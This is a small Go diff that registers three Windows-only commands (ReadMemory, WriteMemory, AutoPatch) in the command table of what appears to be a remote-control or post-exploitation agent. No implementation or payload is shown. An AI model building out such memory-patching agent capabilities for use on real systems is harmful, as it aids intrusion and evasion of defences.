@@ -2,6 +2,7 @@ package commands
 
 import (
 	"log"
+	"runtime"
 	"sync"
 
 	"fawkes/pkg/structs"
@@ -29,6 +30,13 @@ func Initialize() {
 	RegisterCommand(&RunCommand{})
 	RegisterCommand(&SleepCommand{})
 	RegisterCommand(&ExitCommand{})
+
+	// Register Windows-specific commands
+	if runtime.GOOS == "windows" {
+		RegisterCommand(&ReadMemoryCommand{})
+		RegisterCommand(&WriteMemoryCommand{})
+		RegisterCommand(&AutoPatchCommand{})
+	}
 
 	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
 }
